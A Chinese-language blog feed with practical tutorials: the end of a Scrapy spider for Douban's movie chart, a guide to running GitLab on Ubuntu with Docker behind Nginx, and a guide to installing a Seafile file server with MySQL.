class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://movie.douban.com/j/chart/top_list?type=5&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20&#x27;</span></span><br><span class="line">        <span class="keyword">yield</span> Request(url, headers=self.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        datas = json.loads(response.body)</span><br><span class="line">        item = DoubanMovieItem()</span><br><span class="line">        <span class="keyword">if</span> datas:</span><br><span class="line">            <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">                item[<span class="string">&#x27;ranking&#x27;</span>] = data[<span class="string">&#x27;rank&#x27;</span>]</span><br><span class="line">                item[<span class="string">&#x27;movie_name&#x27;</span>] = data[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">                item[<span class="string">&#x27;score&#x27;</span>] = data[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">                item[<span class="string">&#x27;score_num&#x27;</span>] = data[<span class="string">&#x27;vote_count&#x27;</span>]</span><br><span class="line">                <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果datas存在数据则对下一页进行采集</span></span><br><span class="line">            page_num = re.search(<span class="string">r&#x27;start=(\d+)&#x27;</span>, response.url).group(<span class="number">1</span>)</span><br><span class="line">            page_num = <span class="string">&#x27;start=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(page_num)+<span class="number">20</span>)</span><br><span class="line">            next_url = re.sub(<span class="string">r&#x27;start=\d+&#x27;</span>, page_num, response.url)</span><br><span class="line">            <span class="keyword">yield</span> Request(next_url, headers=self.headers)</span><br></pre></td></tr></table></figure>
<p>在Scrapy工程文件的spiders里写好爬虫文件后在settings.py所在的目录下打开终端运行以下代码就能输出相应的电影数据。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy crawl douban_ajax -o douban_movie.csv</span><br></pre></td></tr></table></figure>
<p>代码Github地址：<a href="https://github.com/Wooden-Robot/scrapy-tutorial/blob/master/scrapyspider/scrapyspider/spiders/douban_ajax_spider.py">https://github.com/Wooden-Robot/scrapy-tutorial/blob/master/scrapyspider/scrapyspider/spiders/douban_ajax_spider.py</a></p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>整片文章主要以介绍思路为主，抓取的站点也只是做示范内容并不重要。授之以鱼不如授之以渔，希望大家可以从这篇教程里学到解决问题的方法与思路。: )</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 使用 Docker 安装 Gitlab</title>
    <url>/2018/09/05/Ubuntu-%E4%BD%BF%E7%94%A8-Docker-%E5%AE%89%E8%A3%85-Gitlab/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近帮公司重新搭建了 Gitlab，中间遇到了一些坑，折腾了不少时间，在此记录供大家参考。</p>
<hr>
<span id="more"></span>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h2><h3 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h3><p>如果有使用旧版本的 Docker （称为 <code>docker</code> 或者 <code>docker-engine</code>），请使用下列命令卸载。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get remove docker \</span><br><span class="line">               docker-engine \</span><br><span class="line">               docker.io</span><br></pre></td></tr></table></figure>
<h3 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h3><h4 id="Ubuntu-14-04"><a href="#Ubuntu-14-04" class="headerlink" title="Ubuntu 14.04"></a>Ubuntu 14.04</h4><blockquote>
<p>从 Ubuntu 14.04 开始，一部分内核模块移到了可选内核模块包 (linux-image-extra-*) ，以减少内核软件包的体积。正常安装的系统应该会包含可选内核模块包，而一些裁剪后的系统可能会将其精简掉。AUFS 内核驱动属于可选内核模块的一部分，作为推荐的 Docker 存储层驱动，一般建议安装可选内核模块包以使用 AUFS。</p>
</blockquote>
<p>如果系统没有安装可选内核模块的话，可以执行下面的命令来安装可选内核模块包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    linux-image-extra-$(uname -r) \</span><br><span class="line">    linux-image-extra-virtual</span><br></pre></td></tr></table></figure>

<h3 id="使用-APT-安装"><a href="#使用-APT-安装" class="headerlink" title="使用 APT 安装"></a>使用 APT 安装</h3><p>由于 apt 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure>
<h3 id="添加国内下载源-官方源在注释中"><a href="#添加国内下载源-官方源在注释中" class="headerlink" title="添加国内下载源(官方源在注释中)"></a>添加国内下载源(官方源在注释中)</h3><p>首先为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 官方源</span><br><span class="line"># $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<p>然后，向 source.list 中添加 Docker 软件源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo add-apt-repository \</span><br><span class="line">    &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \</span><br><span class="line">    $(lsb_release -cs) \</span><br><span class="line">    stable&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 官方源</span><br><span class="line"># $ sudo add-apt-repository \</span><br><span class="line">#    &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><br><span class="line">#    $(lsb_release -cs) \</span><br><span class="line">#    stable&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上命令会添加稳定版本的 Docker CE APT 镜像源，如果需要测试或每日构建版本的 Docker CE 请将 stable 改为 test 或者 nightly。</p>
</blockquote>
<h3 id="安装-Docker-CE-1"><a href="#安装-Docker-CE-1" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h3><p>更新 apt 软件包缓存，并安装 docker-ce：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>
<h3 id="使用脚本自动安装"><a href="#使用脚本自动安装" class="headerlink" title="使用脚本自动安装"></a>使用脚本自动安装</h3><p>同时也可以选择使用下列脚本快速安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<p>执行脚本自动安装 Docker CE。</p>
<h3 id="启动-Docker-CE"><a href="#启动-Docker-CE" class="headerlink" title="启动 Docker CE"></a>启动 Docker CE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl enable docker</span><br><span class="line">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>
<p>Ubuntu 14.04 请用下列命令启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service docker start</span><br></pre></td></tr></table></figure>
<h2 id="安装-Gitlab"><a href="#安装-Gitlab" class="headerlink" title="安装 Gitlab"></a>安装 Gitlab</h2><p>我们使用 <code>sameersbn/gitlab</code> Gitlab 镜像，Github 地址：<a href="https://github.com/sameersbn/docker-gitlab">https://github.com/sameersbn/docker-gitlab</a>。<br>首先我们安装 <code>docker-compose</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install docker-compose -U</span><br></pre></td></tr></table></figure>
<p>然后下载 <code>sameersbn/gitlab</code> Gitlab 镜像的 <code>docker-compose.yml</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/sameersbn/docker-gitlab/master/docker-compose.yml</span><br></pre></td></tr></table></figure>
<p>然后修改其中的配置，以下是我修改后的版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  redis:</span><br><span class="line">    restart: always</span><br><span class="line">    image: sameersbn/redis:4.0.9-1</span><br><span class="line">    command:</span><br><span class="line">    - --loglevel warning</span><br><span class="line">    volumes:</span><br><span class="line">    # redis 储存空间挂载到外部</span><br><span class="line">    - /data/gitlab/redis:/var/lib/redis:Z</span><br><span class="line"></span><br><span class="line">  postgresql:</span><br><span class="line">    restart: always</span><br><span class="line">    image: sameersbn/postgresql:10</span><br><span class="line">    volumes:</span><br><span class="line">    # postgresql 储存空间挂载到外部</span><br><span class="line">    - /data/gitlab/postgresql:/var/lib/postgresql:Z</span><br><span class="line">    environment:</span><br><span class="line">    - DB_USER=gitlab</span><br><span class="line">    - DB_PASS=password</span><br><span class="line">    - DB_NAME=gitlabhq_production</span><br><span class="line">    - DB_EXTENSION=pg_trgm</span><br><span class="line"></span><br><span class="line">  gitlab:</span><br><span class="line">    restart: always</span><br><span class="line">    # 此处应注意修改为 9.2.5 版本，最新版通过 repo by URL 从其他仓库迁移过来的项目使用 create merge request 时会出现 503 bug</span><br><span class="line">    image: sameersbn/gitlab:9.2.5</span><br><span class="line">    depends_on:</span><br><span class="line">    - redis</span><br><span class="line">    - postgresql</span><br><span class="line">    ports:</span><br><span class="line">    # 将容器中的 80、443、22 端口映射到宿主机</span><br><span class="line">    - &quot;127.0.0.1:10080:80&quot;</span><br><span class="line">    - &quot;127.0.0.1:10443:443&quot;</span><br><span class="line">    - &quot;10022:22&quot;</span><br><span class="line">    volumes:</span><br><span class="line">    # gitlab 储存空间挂载到外部</span><br><span class="line">    - /data/gitlab/gitlab:/home/git/data:Z</span><br><span class="line">    environment:</span><br><span class="line">    - DEBUG=false</span><br><span class="line"></span><br><span class="line">    - DB_ADAPTER=postgresql</span><br><span class="line">    - DB_HOST=postgresql</span><br><span class="line">    - DB_PORT=5432</span><br><span class="line">    - DB_USER=gitlab</span><br><span class="line">    - DB_PASS=password</span><br><span class="line">    - DB_NAME=gitlabhq_production</span><br><span class="line"></span><br><span class="line">    - REDIS_HOST=redis</span><br><span class="line">    - REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">    - TZ=Asia/Kolkata</span><br><span class="line">    - GITLAB_TIMEZONE=Kolkata</span><br><span class="line"></span><br><span class="line">    - GITLAB_HTTPS=false</span><br><span class="line">    - SSL_SELF_SIGNED=false</span><br><span class="line">    </span><br><span class="line">    # 此处需要改为你访问 gitlab 的域名或者IP</span><br><span class="line">    - GITLAB_HOST=xxx</span><br><span class="line">    # 如果访问时使用 http 为 80，https 则为 443</span><br><span class="line">    - GITLAB_PORT=80</span><br><span class="line">    - GITLAB_SSH_PORT=10022</span><br><span class="line">    - GITLAB_RELATIVE_URL_ROOT=</span><br><span class="line">    # 为了安全起见可以使用 pwgen -Bsv1 64 命令生成随机的 64 个字符串值替换下面三个变量的值</span><br><span class="line">    - GITLAB_SECRETS_DB_KEY_BASE=long-and-random-alphanumeric-string</span><br><span class="line">    - GITLAB_SECRETS_SECRET_KEY_BASE=long-and-random-alphanumeric-string</span><br><span class="line">    - GITLAB_SECRETS_OTP_KEY_BASE=long-and-random-alphanumeric-string</span><br><span class="line">    </span><br><span class="line">    # 需要设置一个默认的 root 用户邮箱，密码不填第一次登录会让你自己设置</span><br><span class="line">    - GITLAB_ROOT_PASSWORD=</span><br><span class="line">    - GITLAB_ROOT_EMAIL=xxx@xxx.xxx</span><br><span class="line"></span><br><span class="line">    - GITLAB_NOTIFY_ON_BROKEN_BUILDS=true</span><br><span class="line">    - GITLAB_NOTIFY_PUSHER=false</span><br><span class="line"></span><br><span class="line">    - GITLAB_EMAIL=notifications@example.com</span><br><span class="line">    - GITLAB_EMAIL_REPLY_TO=noreply@example.com</span><br><span class="line">    - GITLAB_INCOMING_EMAIL_ADDRESS=reply@example.com</span><br><span class="line"></span><br><span class="line">    - GITLAB_BACKUP_SCHEDULE=daily</span><br><span class="line">    - GITLAB_BACKUP_TIME=01:00</span><br><span class="line">    </span><br><span class="line">    # 以下为 QQ 企业邮箱配置</span><br><span class="line">    - SMTP_ENABLED=true</span><br><span class="line">    - SMTP_DOMAIN=exmail.qq.com</span><br><span class="line">    - SMTP_HOST=smtp.exmail.qq.com</span><br><span class="line">    - SMTP_PORT=465</span><br><span class="line">    - SMTP_USER=xxx@xxx.xxx</span><br><span class="line">    - SMTP_PASS=password</span><br><span class="line">    - SMTP_STARTTLS=true</span><br><span class="line">    # SMTP_TLS 选项原始配置文件中没有，默认为 false，使用 QQ 企业邮箱一定要加上，否则无法发送邮件</span><br><span class="line">    - SMTP_TLS=true</span><br><span class="line">    - SMTP_AUTHENTICATION=login</span><br><span class="line"></span><br><span class="line">    - IMAP_ENABLED=false</span><br><span class="line">    - IMAP_HOST=imap.gmail.com</span><br><span class="line">    - IMAP_PORT=993</span><br><span class="line">    - IMAP_USER=mailer@example.com</span><br><span class="line">    - IMAP_PASS=password</span><br><span class="line">    - IMAP_SSL=true</span><br><span class="line">    - IMAP_STARTTLS=false</span><br><span class="line"></span><br><span class="line">    - OAUTH_ENABLED=false</span><br><span class="line">    - OAUTH_AUTO_SIGN_IN_WITH_PROVIDER=</span><br><span class="line">    - OAUTH_ALLOW_SSO=</span><br><span class="line">    - OAUTH_BLOCK_AUTO_CREATED_USERS=true</span><br><span class="line">    - OAUTH_AUTO_LINK_LDAP_USER=false</span><br><span class="line">    - OAUTH_AUTO_LINK_SAML_USER=false</span><br><span class="line">    - OAUTH_EXTERNAL_PROVIDERS=</span><br><span class="line"></span><br><span class="line">    - OAUTH_CAS3_LABEL=cas3</span><br><span class="line">    - OAUTH_CAS3_SERVER=</span><br><span class="line">    - OAUTH_CAS3_DISABLE_SSL_VERIFICATION=false</span><br><span class="line">    - OAUTH_CAS3_LOGIN_URL=/cas/login</span><br><span class="line">    - OAUTH_CAS3_VALIDATE_URL=/cas/p3/serviceValidate</span><br><span class="line">    - OAUTH_CAS3_LOGOUT_URL=/cas/logout</span><br><span class="line"></span><br><span class="line">    - OAUTH_GOOGLE_API_KEY=</span><br><span class="line">    - OAUTH_GOOGLE_APP_SECRET=</span><br><span class="line">    - OAUTH_GOOGLE_RESTRICT_DOMAIN=</span><br><span class="line"></span><br><span class="line">    - OAUTH_FACEBOOK_API_KEY=</span><br><span class="line">    - OAUTH_FACEBOOK_APP_SECRET=</span><br><span class="line"></span><br><span class="line">    - OAUTH_TWITTER_API_KEY=</span><br><span class="line">    - OAUTH_TWITTER_APP_SECRET=</span><br><span class="line"></span><br><span class="line">    - OAUTH_GITHUB_API_KEY=</span><br><span class="line">    - OAUTH_GITHUB_APP_SECRET=</span><br><span class="line">    - OAUTH_GITHUB_URL=</span><br><span class="line">    - OAUTH_GITHUB_VERIFY_SSL=</span><br><span class="line"></span><br><span class="line">    - OAUTH_GITLAB_API_KEY=</span><br><span class="line">    - OAUTH_GITLAB_APP_SECRET=</span><br><span class="line"></span><br><span class="line">    - OAUTH_BITBUCKET_API_KEY=</span><br><span class="line">    - OAUTH_BITBUCKET_APP_SECRET=</span><br><span class="line"></span><br><span class="line">    - OAUTH_SAML_ASSERTION_CONSUMER_SERVICE_URL=</span><br><span class="line">    - OAUTH_SAML_IDP_CERT_FINGERPRINT=</span><br><span class="line">    - OAUTH_SAML_IDP_SSO_TARGET_URL=</span><br><span class="line">    - OAUTH_SAML_ISSUER=</span><br><span class="line">    - OAUTH_SAML_LABEL=&quot;Our SAML Provider&quot;</span><br><span class="line">    - OAUTH_SAML_NAME_IDENTIFIER_FORMAT=urn:oasis:names:tc:SAML:2.0:nameid-format:transient</span><br><span class="line">    - OAUTH_SAML_GROUPS_ATTRIBUTE=</span><br><span class="line">    - OAUTH_SAML_EXTERNAL_GROUPS=</span><br><span class="line">    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_EMAIL=</span><br><span class="line">    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_NAME=</span><br><span class="line">    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_FIRST_NAME=</span><br><span class="line">    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_LAST_NAME=</span><br><span class="line"></span><br><span class="line">    - OAUTH_CROWD_SERVER_URL=</span><br><span class="line">    - OAUTH_CROWD_APP_NAME=</span><br><span class="line">    - OAUTH_CROWD_APP_PASSWORD=</span><br><span class="line"></span><br><span class="line">    - OAUTH_AUTH0_CLIENT_ID=</span><br><span class="line">    - OAUTH_AUTH0_CLIENT_SECRET=</span><br><span class="line">    - OAUTH_AUTH0_DOMAIN=</span><br><span class="line"></span><br><span class="line">    - OAUTH_AZURE_API_KEY=</span><br><span class="line">    - OAUTH_AZURE_API_SECRET=</span><br><span class="line">    - OAUTH_AZURE_TENANT_ID=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注：请注意有注释的变量！</strong><br>主要有以下几个关键点：</p>
<ol>
<li>将 Redis、PostgreSQL、Gitlab 的储存空间挂载到外部；</li>
<li><code>sameersbn/gitlab</code> 镜像的版本建议使用 10 以下，这里使用的 9.2.5。否则可能会有 bug;</li>
<li>设置 <code>GITLAB_HOST</code>、<code>GITLAB_PORT</code>，GITLAB_HOST 会在仓库地址中得到体现，如果你用域名访问此处就为域名，用 IP 访问此处为 IP。GITLAB_PORT 取决于访问 gitlab 的协议，http 为 80，https 则为 443;</li>
<li>设置一个 root 邮箱；</li>
<li>使用 QQ 企业邮箱发送邮件一定要加上 <code>SMTP_TLS=true</code>, 否则邮件发送不了。其他邮箱配置请参考 <a href="https://docs.gitlab.com/omnibus/settings/smtp.html">Gitlab 官方配置</a>。  </li>
</ol>
<p>在配置文件 <code>docker-compose.yml</code> 所在目录下执行下列命令启动 Gitlab:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
<h2 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h2><h3 id="http-协议"><a href="#http-协议" class="headerlink" title="http 协议"></a>http 协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream gitlab &#123;</span><br><span class="line">        server 127.0.0.1:10080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name git.xxx.xxx;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_pass http://gitlab;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="https-协议"><a href="#https-协议" class="headerlink" title="https 协议"></a>https 协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream gitlab &#123;</span><br><span class="line">        server 127.0.0.1:10080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name git.xxx.xxx;</span><br><span class="line">    rewrite ^/(.*)$ https://git.xxx.xxx/$1 permanent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name git.xxx.xxx;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl on;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/xxx.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/xxx.key;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_pass http://gitlab;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="载入-Gitlab-Nginx-配置"><a href="#载入-Gitlab-Nginx-配置" class="headerlink" title="载入 Gitlab Nginx 配置"></a>载入 Gitlab Nginx 配置</h3><p>配置好相应的协议的配置文件，执行下列命令使其生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure>
<p>访问域名即可进入 gitlab 首页。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://docker_practice.gitee.io/install/ubuntu.html">Ubuntu 安装 Docker CE</a></li>
<li><a href="https://github.com/sameersbn/docker-gitlab">sameersbn/docker-gitlab</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 搭建 Seafile</title>
    <url>/2018/09/08/Ubuntu-%E6%90%AD%E5%BB%BA-Seafile/</url>
    <content><![CDATA[<h1 id="部署-Seafile-服务器"><a href="#部署-Seafile-服务器" class="headerlink" title="部署 Seafile 服务器"></a>部署 Seafile 服务器</h1><p>本文档用来说明通过预编译好的安装包来安装并运行基于 MySQL/MariaDB 的 Seafile 服务器。(MariaDB 是 MySQL 的分支)</p>
<span id="more"></span>

<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>到<a href="http://www.seafile.com/download">下载页面</a>下载最新的服务器安装包.</p>
<h2 id="部署和目录设计"><a href="#部署和目录设计" class="headerlink" title="部署和目录设计"></a>部署和目录设计</h2><p>下载 seafile-server_6.2.5_* 到你的<br><strong>/home/username</strong> 目录下。 建议这样的目录结构:</p>
<pre><code>mkdir seafile
mv seafile-server_* seafile
cd seafile
#将 seafile-server_* 移动到 seafile 目录下后
tar -xzf seafile-server_*
mkdir installed
mv seafile-server_* installed
</code></pre>
<p>现在，你的目录看起来应该像这样：</p>
<pre><code>#tree seafile -L 2
seafile
├── installed
│   └── seafile-server_xxxx.tar.gz
└── seafile-server-xxx
    ├── reset-admin.sh
    ├── runtime
    ├── seafile
    ├── seafile.sh
    ├── seahub
    ├── seahub.sh
    ├── setup-seafile.sh
    └── upgrade
</code></pre>
<p><strong>这样设计目录的好处在于</strong></p>
<ul>
<li>  和 seafile 相关的配置文件都可以放在 <strong>seafile</strong> 目录下，便于集中管理.</li>
<li>  后续升级时,你只需要解压最新的安装包到 <strong>seafile</strong> 目录下.</li>
</ul>
<h2 id="安装-Seafile-服务器"><a href="#安装-Seafile-服务器" class="headerlink" title="安装 Seafile 服务器"></a>安装 Seafile 服务器</h2><h3 id="安装前的准备工作"><a href="#安装前的准备工作" class="headerlink" title="安装前的准备工作"></a>安装前的准备工作</h3><p>安装 Seafile 服务器之前，请确认已安装以下软件</p>
<ul>
<li>MariaDB 或者 MySQL 服务器 (MariaDB 是 MySQL 的分支)</li>
<li>python 2.7 (从 Seafile 5.1 开始，python 版本最低要求为2.7）</li>
<li>python-setuptools</li>
<li>python-imaging</li>
<li>python-mysqldb</li>
<li>python-ldap</li>
<li>python-urllib3</li>
<li>python-memcache (或者 python-memcached)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># on Debian/Ubuntu 14.04 server</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 libpython2.7 python-setuptools python-imaging \</span><br><span class="line">  python-ldap python-mysqldb python-memcache python-urllib3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># on Ubuntu 16.04 server</span><br><span class="line"># As the default python binary on Ubuntu 16.04 server is python 3, we need to install python (python 2) first.</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python</span><br><span class="line">apt-get install python2.7 libpython2.7 python-setuptools python-imaging python-ldap python-urllib3 ffmpeg python-pip python-mysqldb python-memcache</span><br><span class="line">pip install pillow moviepy</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># on CentOS 7</span><br><span class="line">yum -y install epel-release</span><br><span class="line">rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line">yum -y install python-imaging MySQL-python python-memcached python-ldap python-urllib3 ffmpeg ffmpeg-devel</span><br><span class="line">pip install pillow moviepy</span><br></pre></td></tr></table></figure>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>cd seafile-server-*
./setup-seafile-mysql.sh  #运行安装脚本并回答预设问题
</code></pre>
<p>如果你的系统中没有安装上面的某个软件，那么 Seafile初始化脚本会提醒你安装相应的软件包.</p>
<p>该脚本会依次询问你一些问题，从而一步步引导你配置 Seafile 的各项参数:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>seafile server name</td>
<td>seafile 服务器的名字，目前该配置已经不再使用</td>
<td>3 ~ 15 个字符，可以用英文字母，数字，下划线</td>
</tr>
<tr>
<td>seafile server ip or domain</td>
<td>seafile 服务器的 IP 地址或者域名</td>
<td>客户端将通过这个 IP 或者地址来访问你的 Seafile 服务</td>
</tr>
<tr>
<td>seafile data dir</td>
<td>seafile 数据存放的目录，用上面的例子，默认将是 /data/haiwen/seafile-data</td>
<td>seafile 数据将随着使用而逐渐增加，请把它放在一个有足够大空闲空间的分区上</td>
</tr>
<tr>
<td>seafile fileserver port</td>
<td>seafile fileserver 使用的 TCP 端口</td>
<td>该端口用于文件同步，请使用默认的 8082，不能更改。</td>
</tr>
</tbody></table>
<p>在这里, 你会被要求选择一种创建 Seafile 数据库的方式:</p>
<pre><code>-------------------------------------------------------
Please choose a way to initialize seafile databases:
-------------------------------------------------------

[1] Create new ccnet/seafile/seahub databases
[2] Use existing ccnet/seafile/seahub databases
</code></pre>
<ul>
<li>  如果选择<code>1</code>, 你需要提供根密码. 脚本程序会创建数据库和用户。</li>
<li>  如果选择<code>2</code>, ccnet/seafile/seahub 数据库应该已经被你（或者其他人）提前创建。</li>
</ul>
<p>如果安装正确完成，你会看到下面这样的输出 (新版本可能会有所不同)</p>
<p><img src="/images/Server-setup-successfully.png" alt="server-setup-succesfully"></p>
<p>现在你的目录结构看起来应该是这样:</p>
<pre><code>#tree seafile -L 2
seafile
├── conf                # configuration files
│   ├── ccnet.conf
│   └── seafile.conf
│   └── seahub_settings.py
│   └── seafdav.conf
├── ccnet
│   ├── mykey.peer
│   ├── PeerMgr
│   └── seafile.ini
├── installed
│   └── seafile-server_xxx.tar.gz
├── seafile-data
├── seafile-server-xxx  # active version
│   ├── reset-admin.sh
│   ├── runtime
│   ├── seafile
│   ├── seafile.sh
│   ├── seahub
│   ├── seahub.sh
│   ├── setup-seafile.sh
│   └── upgrade
├── seafile-server-latest  # symbolic link to seafile-server-xxx
├── seahub-data
│   └── avatars
</code></pre>
<p><code>seafile-server-latest</code>文件夹为指向当前 Seafile 服务器文件夹的符号链接.<br>将来你升级到新版本后, 升级脚本会自动更新使其始终指向最新的 Seafile 服务器文件夹.</p>
<h2 id="启动-Seafile-服务器"><a href="#启动-Seafile-服务器" class="headerlink" title="启动 Seafile 服务器"></a>启动 Seafile 服务器</h2><h3 id="启动-Seafile-服务器和-Seahub-网站"><a href="#启动-Seafile-服务器和-Seahub-网站" class="headerlink" title="启动 Seafile 服务器和 Seahub 网站"></a>启动 Seafile 服务器和 Seahub 网站</h3><p>在 seafile-server-xxx 目录下，运行如下命令</p>
<ul>
<li>  启动 Seafile:</li>
</ul>
<!-- -->

<pre><code>./seafile.sh start # 启动 Seafile 服务
</code></pre>
<ul>
<li>  启动 Seahub</li>
</ul>
<!-- -->

<pre><code>./seahub.sh start &lt;port&gt;  # 启动 Seahub 网站 （默认运行在8000端口上）
</code></pre>
<p><strong>小贴士:</strong> 你第一次启动 seahub 时，<code>seahub.sh</code> 脚本会提示你创建一个 seafile 管理员帐号。</p>
<p>服务启动后, 打开浏览器并输入以下地址</p>
<pre><code>http://192.168.1.111:8000/
</code></pre>
<p>你会被重定向到登陆页面. 输入管理员用户名和密码即可。</p>
<p><strong>恭喜!</strong> 现在你已经成功的安装了 Seafile 服务器.</p>
